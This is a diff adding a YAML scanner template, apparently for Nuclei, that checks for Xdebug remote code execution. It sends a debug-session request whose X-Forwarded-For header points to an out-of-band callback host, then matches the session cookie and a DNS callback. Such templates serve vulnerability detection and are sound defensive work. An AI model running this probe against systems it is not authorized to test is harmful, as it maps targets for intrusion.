@@ -1,0 +1,40 @@
+id: poc-yaml-xdebug-rce
+info:
+  name: Xdebug Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  random: "{{rand_text_alphanumeric(6)}}"
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /?XDEBUG_SESSION_START={{random}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: {{reverse}}
+
+    extractors:
+      - type: regex
+        name: session_cookie
+        part: header
+        regex:
+          - "Set-Cookie: XDEBUG_SESSION={{random}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: XDEBUG_SESSION={{random}}"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
